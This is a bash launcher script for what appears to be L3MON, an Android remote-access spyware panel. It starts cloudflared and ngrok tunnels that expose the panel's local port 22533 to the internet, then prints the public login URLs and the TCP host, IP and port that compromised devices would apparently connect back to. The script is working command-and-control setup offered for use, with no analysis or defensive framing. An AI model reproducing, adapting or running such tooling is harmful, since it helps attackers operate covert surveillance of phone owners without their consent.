#!/bin/bash
# configure /L3MON/config/ngrok/ngrok.yml first 
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'
chmod +x /L3MON/ngrok/cloudflared-linux-amd64 > /dev/null &
echo > /L3MON/ngrok/.cf.log > /dev/null &
/L3MON/ngrok/cloudflared-linux-amd64 tunnel -url 127.0.0.1:22533 --logfile /L3MON/ngrok/.cf.log > /dev/null 2>&1 &

/L3MON/ngrok/ngrok start --all > /dev/null &
sleep 8
cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}')
port=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|tail -1)

echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $cdf"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $brows"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan TCP  $Green        =$IYellow $links"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan IP   $Green        =$IYellow $ip"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan VPORT$Green        =$IYellow $port $clear"
